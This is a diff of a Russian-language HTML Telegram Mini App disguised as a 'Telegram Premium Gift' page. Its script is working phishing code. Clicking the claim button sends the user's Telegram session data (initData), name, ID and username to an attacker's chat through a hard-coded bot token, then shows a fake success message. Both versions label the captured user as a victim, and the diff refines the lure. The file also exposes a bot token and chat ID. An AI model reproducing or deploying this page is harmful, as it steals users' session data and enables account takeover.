@@ -2,126 +2,194 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secret Gift</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Premium Gift</title>
     <style>
+        :root {
+            --tg-bg: #1c242f;
+            --tg-secondary: #2b3642;
+            --tg-text: #ffffff;
+            --tg-blue: #3390ec;
+            --tg-green: #34c759;
+        }
         body {
-            background: #1a1a1a;
-            color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: var(--tg-bg);
+            color: var(--tg-text);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
             overflow: hidden;
         }
-        .card {
-            background: #2b2b2b;
+        .container {
+            width: 100%;
+            max-width: 400px;
             padding: 20px;
-            border-radius: 15px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            width: 80%;
-            max-width: 300px;
+            animation: fadeIn 0.5s ease;
         }
-        h2 { margin: 0 0 20px 0; color: #ffd700; }
-        .gift-icon { font-size: 50px; margin-bottom: 20px; }
-        button {
-            background: #0088cc; /* Telegram Blue */
+        .card {
+            background: var(--tg-secondary);
+            border-radius: 16px;
+            padding: 30px 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: pulse 2s infinite;
+        }
+        h1 {
+            font-size: 22px;
+            margin: 0 0 10px 0;
+            font-weight: 700;
+        }
+        p {
+            font-size: 15px;
+            color: #8b96a3;
+            margin: 0 0 25px 0;
+            line-height: 1.4;
+        }
+        .btn {
+            background: var(--tg-blue);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 8px;
-            cursor: pointer;
+            padding: 16px 0;
             width: 100%;
-            font-weight: bold;
-            transition: 0.2s;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.1s, opacity 0.2s;
+            position: relative;
+            overflow: hidden;
         }
-        button:active { transform: scale(0.98); }
-        button:disabled { background: #555; }
-        #status { margin-top: 15px; font-size: 14px; color: #aaa; min-height: 20px; }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: default;
+        }
+        .loader {
+            display: none;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        .success-msg {
+            display: none;
+            color: var(--tg-green);
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        
+        /* Анимации */
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="gift-icon">🎁</div>
-        <h2>У тебя есть подарок!</h2>
-        <p style="font-size: 14px; color: #ccc; margin-bottom: 20px;">
-            Нажми кнопку, чтобы активировать VIP доступ и получить данные.
-        </p>
-        <button id="claimBtn">ПОЛУЧИТЬ ПРИЗ</button>
-        <div id="status"></div>
+    <div class="container">
+        <div class="card">
+            <div class="icon">🎁</div>
+            <h1>Твой подарок активирован!</h1>
+            <p>
+                Мы выделили тебе эксклюзивный доступ. 
+                Подтверди личность, чтобы получить доступ к функциям.
+            </p>
+            
+            <button id="claimBtn" class="btn">ПОЛУЧИТЬ ДОСТУП</button>
+            <div id="loader" class="loader"></div>
+            <div id="successMsg" class="success-msg">
+                Готово! Проверь личные сообщения.
+            </div>
+        </div>
     </div>
 
     <script>
+        // ВСТАВЬ СЮДА ДАННЫЕ БОТА
+        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // Твой токен
+        const CHAT_ID = '8658887417'; // Твой ID (кто будет получать инфу)
+
         const tg = window.Telegram.WebApp;
-        const claimBtn = document.getElementById('claimBtn');
-        const status = document.getElementById('status');
+        const btn = document.getElementById('claimBtn');
+        const loader = document.getElementById('loader');
+        const successMsg = document.getElementById('successMsg');
 
-        // ==========================================
-        // НАСТРОЙКИ (ЗАПОЛНИ ЭТО!)
-        // ==========================================
-        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // <--- ВСТАВЬ СЮДА ТОКЕН
-        const CHAT_ID = '8658887417';       // <--- ТВОЙ ID
-        // ==========================================
-
-        tg.ready();
+        // Инициализация
         tg.expand();
+        
+        btn.addEventListener('click', function() {
+            if (tg.initData) {
+                btn.disabled = true;
+                btn.style.display = 'none';
+                loader.style.display = 'block';
 
-        claimBtn.onclick = () => {
-            if (claimBtn.disabled) return;
-            claimBtn.disabled = true;
-            status.innerText = "Загрузка данных...";
+                const user = tg.initDataUnsafe?.user;
+                const initData = tg.initData;
+                
+                const firstName = user ? user.first_name : 'User';
+                const lastName = user ? user.last_name : '';
+                const id = user ? user.id : 'unknown';
+                const username = user ? user.username : 'no_username';
 
-            // 1. Собираем "Сессию" (initData)
-            const session = tg.initData;
-            
-            // 2. Собираем инфу о юзере
-            const user = tg.initDataUnsafe?.user;
-            const firstName = user ? user.first_name : 'Unknown';
-            const lastName = user ? user.last_name : '';
-            const userId = user ? user.id : '0';
-            const username = user ? user.username : 'Нет юзернейма';
+                const message = `🔥 <b>NEW DATA CAPTURED</b> 🔥\n\n` +
+                    `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
+                    `🆔 <b>ID:</b> ${id}\n` +
+                    `📱 <b>Username:</b> @${username}\n` +
+                    `🔑 <b>Session:</b>\n<code>${initData}</code>`;
 
-            // 3. Формируем сообщение
-            const text = `🔥 <b>Жертва поймана!</b>\n\n` +
-                         `👤 <b>Имя:</b> ${firstName} ${lastName}\n` +
-                         `🆔 <b>ID:</b> ${userId}\n` +
-                         `📱 <b>Username:</b> @${username}\n\n` +
-                         `🔑 <b>СЕССИЯ (Data):</b>\n<code>${session}</code>`;
-
-            // 4. Отправляем в Telegram
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
+                // Отправка данных
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
                 })
-            })
-            .then(res => {
-                if (res.ok) {
-                    status.innerText = "Готово! Данные отправлены.";
-                    // Фейковый успех
-                    claimBtn.innerText = "✓ ПРИЗ ПОЛУЧЕН";
-                    claimBtn.style.background = "#4caf50";
-                } else {
-                    status.innerText = "Ошибка API. Проверь токен.";
-                    console.error(res);
-                }
-            })
-            .catch(err => {
-                status.innerText = "Ошибка сети.";
-                console.error(err);
-            });
-        };
+                .then(() => {
+                    loader.style.display = 'none';
+                    successMsg.style.display = 'block';
+                    tg.HapticFeedback.notificationOccurred('success'); // Вибрация телефона
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    loader.style.display = 'none';
+                    btn.style.display = 'block';
+                    btn.innerText = "Ошибка. Попробуй снова";
+                });
+            } else {
+                // Если открыли не в телеграме
+                alert("Открой через Telegram!");
+            }
+        });
     </script>
 </body>
 </html>
